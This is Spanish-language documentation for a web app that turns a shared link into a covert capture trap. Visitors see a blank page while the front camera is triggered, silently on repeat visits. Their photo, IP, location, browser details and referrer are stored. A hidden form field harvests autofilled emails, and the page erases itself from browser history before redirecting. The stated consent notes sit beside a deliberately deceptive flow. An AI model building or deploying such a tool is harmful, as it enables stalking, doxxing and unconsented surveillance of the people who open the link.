# Documentación — Redirect Capture

Página intermedia que captura la foto de la cámara frontal del visitante (con el
consentimiento del navegador) y lo redirige a una web configurada por el
administrador. El administrador ve las capturas con sus metadatos y configura todo
desde un panel.

---

## 1. Arquitectura

```
Visitante                    Servidor (Node.js + Express)              Admin
   │            ┌───────────────────────┐                  ┌──────────────┐
   ├─/r/:token─▶│ capture.html (BD)     │                  │ /admin (panel)│
   │  cámara    │  → POST /api/capture  │──SQLite────────▶│ capturas +    │
   │  (opcional)│  → POST /api/google-login (Google)       │ metadatos     │
   └─redirige──▶│ URL destino (settings)│                  │ settings/HTML │
                └───────────────────────┘                  └──────────────┘
```

- **Frontend**: HTML/JS vanilla servido desde Express (`public/`). La página de
  captura se sirve **desde la base de datos** (`settings.capture_html`) y es
  editable desde el panel admin.
- **Backend**: Express + `better-sqlite3` (archivo `capturas.db`).
- **Proxy en producción**: Caddy (`docker-compose.yml`, perfil `production`) con
  HTTPS automático (Let's Encrypt) hacia `app:3000` por red interna.

---

## 2. Flujo del visitante

1. Abre el enlace `https://<dominio>/r/<token>`. Ve una página en blanco.
2. El script intenta la cámara frontal automáticamente (`getUserMedia` con
   `facingMode: 'user'`).
   - **Primera visita**: el navegador muestra su popup de permiso (obligatorio).
   - **Visitas siguientes** (mismo navegador): permiso ya concedido → captura en
     silencio, sin popups.
   - Si el usuario niega/cierra el popup: aparece el botón «Presiona aquí para ir a
     la web page» para reintentar.
3. La foto se dibuja en un `<canvas>` (máx. 640 px), se codifica en JPEG y se envía
   a `POST /api/capture` junto con los metadatos.
4. El servidor guarda la imagen en `uploads/` y la fila en SQLite, y responde con la
   URL destino.
5. `window.location.replace(destino)` — la página intermedia **no queda en el
   historial** ni en el botón «atrás».

### Modo «Con login de Google» (opcional, configurable)

- Activado desde el panel admin (`capture_mode = google` + `google_client_id`).
- La página carga Google Identity Services (GIS) y muestra el **botón oficial de
  Google** «Continuar con Google». El usuario se autentica en la pantalla genuina
  de Google; **las credenciales jamás pasan por este servidor**.
- El JWT recibido se envía a `POST /api/google-login`; el servidor lo **verifica**
  contra `https://oauth2.googleapis.com/tokeninfo` (aud = client_id configurado) y
  devuelve un `verify_token` temporal (5 min, un solo uso).
- El email + `verify_token` se adjuntan a `POST /api/capture`; el servidor valida el
  emparejamiento antes de guardarlo. Así no se puede inyectar emails falsos.
- Es **opcional**: la cámara y la redirección siguen automáticas aunque el usuario
  no use Google.

---

## 3. Metadatos registrados por captura

| Campo        | Origen                                              |
|--------------|-----------------------------------------------------|
| `filename`   | Imagen en `uploads/` (o null si se negó la cámara)  |
| `ip`         | `req.ip` (con `trust proxy` detrás de Caddy)        |
| `user_agent` | Cabecera del navegador                              |
| `referrer`   | `document.referrer` (de dónde llegó el visitante)   |
| `lat`/`lng`  | Geolocalización solo si el permiso ya estaba dado   |
| `tz`         | Zona horaria del navegador                          |
| `lang`       | Idioma del navegador                                |
| `email`      | Autofill del navegador (no garantizado) o Google    |
| `created_at` | Fecha (UTC)                                         |

---

## 4. Endpoints

### Públicos
| Método | Ruta                 | Descripción                                          |
|--------|----------------------|------------------------------------------------------|
| GET    | `/r/:token`          | Página de captura (HTML desde BD + config inyectada) |
| POST   | `/api/capture`       | Guarda foto + metadatos; responde URL destino        |
| POST   | `/api/google-login`  | Verifica JWT de Google; devuelve `verify_token`      |

### Admin (requieren sesión)
| Método | Ruta                              | Descripción                              |
|--------|-----------------------------------|------------------------------------------|
| GET    | `/admin`                          | Panel admin                              |
| GET    | `/admin/api/me`                   | Estado de sesión                         |
| POST   | `/admin/login` `/admin/logout`    | Autenticación                            |
| GET/POST | `/admin/api/settings`           | URL destino, token, modo, client ID      |
| GET/POST | `/admin/api/capture-html`      | Leer/guardar HTML de la página de captura|
| POST   | `/admin/api/capture-html/reset`   | Restaurar HTML por defecto               |
| GET    | `/admin/api/captures`             | Listado paginado (12 por página)         |
| GET    | `/captures/:file`                 | Sirve la imagen (solo con sesión)        |

**Seguridad**: login con bcrypt + sesión `httpOnly`; imágenes 401 sin sesión;
rate limit 5 capturas/min por IP; validación de magic bytes de imagen; emails solo
con token verificado de Google.

---

## 5. Base de datos (SQLite)

Tabla `settings` (clave/valor):

| Clave               | Descripción                                   |
|---------------------|-----------------------------------------------|
| `destination_url`   | URL a la que se redirige al visitante         |
| `entry_token`       | Token del enlace `/r/<token>`                 |
| `capture_mode`      | `normal` (default) o `google`                 |
| `google_client_id`  | Client ID OAuth de Google (vacío por defecto) |
| `capture_html`      | HTML editable de la página de captura         |

Tabla `captures`: foto, IP, user-agent, referrer, ubicación, idioma, zona horaria,
email, fecha (ver §3).

Tabla `admins`: usuario y hash bcrypt (creado al primer arranque desde `.env`).

---

## 6. Configuración del login con Google (paso a paso)

1. **Google Cloud Console** → crea un proyecto.
2. Menú: **APIs y servicios → Credenciales → Crear credenciales → ID de cliente
   OAuth 2.0**.
3. Tipo de aplicación: **Aplicación web**. En «Orígenes de JavaScript autorizados»
   agrega `https://tu-dominio.com` (y `http://localhost:3000` para pruebas locales).
4. Copia el **Client ID** (termina en `.apps.googleusercontent.com`).
5. Panel admin → Redirección → Modo: **Con login de Google** → pega el Client ID →
   Guardar.
6. Los usuarios que hagan clic en «Continuar con Google» quedarán con su email
   verificado en las capturas.

---

## 7. Panel de administración

- **Redirección**: URL destino, token del enlace, modo (normal/Google), Client ID,
  y el enlace completo de captura con botón «Copiar».
- **Página de captura (HTML)**: editor del HTML que ven los visitantes, con
  «Guardar HTML» y «Restaurar HTML por defecto». Aviso: conservar
  `window.__GOOGLE_CONFIG__` y los IDs `continueBtn`, `googleBtn`, `emailField`
  para no romper el flujo.
- **Capturas**: galería con foto, email, IP, referrer, navegador, idioma, zona
  horaria, ubicación y fecha, con paginación.

---

## 8. Despliegue

### Local (pruebas)
```bash
cp .env.example .env   # cambiar ADMIN_PASS y SESSION_SECRET
docker compose up -d --build
# http://localhost:3000  (localhost es contexto seguro: la cámara funciona)
```

### Producción (AWS EC2)
```bash
docker compose --profile production up -d --build
```
Caddy (80/443, Let's Encrypt automático) → `app:3000` por red interna. El security
group de AWS abre solo 22/80/443. Editar `Caddyfile` con el dominio real. Detalles
completos en README.md.

---

## 9. Notas legales y privacidad

- La foto se captura únicamente con el consentimiento del visitante mediante el
  prompt de cámara del navegador (obligatorio por diseño del navegador).
- El email solo se obtiene con consentimiento explícito (login de Google) o cuando
  el navegador autocompleta el campo oculto (no es garantizable).
- Verifica que tu uso cumpla la normativa aplicable (GDPR, Ley 19.628 de Chile,
  etc.) y que la captura sea proporcional, informada y legítima.